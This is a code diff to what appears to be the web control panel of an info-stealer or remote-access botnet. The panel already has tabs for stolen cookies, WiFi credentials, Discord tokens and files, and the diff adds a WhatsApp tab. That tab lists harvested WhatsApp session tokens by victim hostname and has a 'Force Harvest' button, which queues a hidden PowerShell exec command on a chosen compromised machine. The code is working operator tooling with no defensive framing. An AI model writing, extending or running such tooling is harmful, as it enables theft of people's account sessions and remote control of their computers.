@@ -98,6 +98,7 @@
       <button class="tab-btn" onclick="switchTab('cookies', this)">Cookies</button>
       <button class="tab-btn" onclick="switchTab('wifi', this)">WiFi</button>
       <button class="tab-btn" onclick="switchTab('discord', this)">Discord</button>
+      <button class="tab-btn" onclick="switchTab('whatsapp', this)">WhatsApp</button>
       <button class="tab-btn" onclick="switchTab('files', this)">Files</button>
     </div>
 
@@ -299,6 +300,27 @@
             <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition disabled:opacity-50" id="discordSendBtn" onclick="sendDiscordMsg()">Send</button>
           </div>
         </div>
+      </div>
+    </main>
+
+    <main id="tabWhatsApp" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <div class="flex items-center gap-3 mb-5">
+        <button class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition" onclick="forceWhatsAppHarvest()">Force Harvest</button>
+        <span class="text-xs text-slate-500" id="whatsappStatus">Tokens appear below</span>
+      </div>
+      <div class="overflow-x-auto">
+        <table class="w-full text-left border-collapse">
+          <thead>
+            <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
+              <th class="py-3 px-4 w-48">Time</th>
+              <th class="py-3 px-4 w-32">Host</th>
+              <th class="py-3 px-4">Token</th>
+            </tr>
+          </thead>
+          <tbody id="whatsappBody" class="text-sm divide-y divide-slate-800/50">
+            <tr><td class="py-8 px-4 text-center text-slate-500" colspan="3">No WhatsApp tokens found yet</td></tr>
+          </tbody>
+        </table>
       </div>
     </main>
 
@@ -617,6 +639,7 @@ function switchTab(tab, btn) {
   document.getElementById('tabCookies').classList.toggle('active', tab === 'cookies');
   document.getElementById('tabWiFi').classList.toggle('active', tab === 'wifi');
   document.getElementById('tabDiscord').classList.toggle('active', tab === 'discord');
+  document.getElementById('tabWhatsApp').classList.toggle('active', tab === 'whatsapp');
   document.getElementById('tabFiles').classList.toggle('active', tab === 'files');
   if (tab === 'screenshots') fetchScreenshots();
   if (tab === 'triggers') fetchTriggers();
@@ -625,6 +648,7 @@ function switchTab(tab, btn) {
   if (tab === 'cookies') fetchCookies();
   if (tab === 'wifi') fetchWiFi();
   if (tab === 'discord') { fetchDiscordTokens(); document.getElementById('discordStatus').textContent = g_discordToken ? 'Token loaded' : 'No token'; }
+  if (tab === 'whatsapp') fetchWhatsAppTokens();
   if (tab === 'files') { populateFileHostnames(); fetchFileResults(); }
 }
 
@@ -1124,6 +1148,43 @@ async function forceDiscordHarvest() {
   btn.disabled = false; btn.textContent = 'Force Harvest';
 }
 
+async function fetchWhatsAppTokens() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/whatsapp_tokens?select=id,created_at,hostname,token&order=created_at.desc&limit=50'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const tbody = document.getElementById('whatsappBody');
+    if (!data || data.length === 0) {
+      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="3">No WhatsApp tokens found yet</td></tr>';
+      return;
+    }
+    tbody.innerHTML = data.map(row => {
+      const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
+      const host = row.hostname || '-';
+      const token = row.token || '';
+      const masked = token.length > 20 ? token.substring(0, 10) + '&#8226;'.repeat(20) + token.substring(token.length - 5) : '&#8226;'.repeat(20);
+      return '<tr class="hover:bg-slate-800/30 transition-colors">'
+        + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap text-xs">' + ts + '</td>'
+        + '<td class="py-3 px-4 text-emerald-400 font-medium text-xs">' + escapeHtml(host) + '</td>'
+        + '<td class="py-3 px-4 text-xs mono-log break-all"><span class="token-mask cursor-pointer text-slate-400 hover:text-slate-200" onclick="this.textContent = this.dataset.token" data-token="' + escapeHtml(token) + '" title="Click to reveal">' + masked + '</span></td>'
+        + '</tr>';
+    }).join('');
+  } catch (_) {}
+}
+
+async function forceWhatsAppHarvest() {
+  const hostname = document.getElementById('hostnameInput').value.trim();
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
+  try {
+    await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'exec', hostname: hostname, payload: 'powershell -w h -c "WhatsApp session check"', executed: false })
+    });
+    showToast('WhatsApp harvest triggered (check back in ~5 min)', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+}
+
 async function sendDirlist() {
   const path = document.getElementById('filePath').value.trim();
   const hostname = document.getElementById('fileHostSelect').value;
@@ -1232,6 +1293,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'cookies') fetchCookies();
     else if (currentTab === 'wifi') fetchWiFi();
     else if (currentTab === 'discord') { fetchDiscordTokens(); document.getElementById('discordStatus').textContent = g_discordToken ? 'Token loaded' : 'No token'; }
+    else if (currentTab === 'whatsapp') fetchWhatsAppTokens();
     else if (currentTab === 'files') fetchFileResults();
   }, 20000);
   setInterval(tick, 1000);
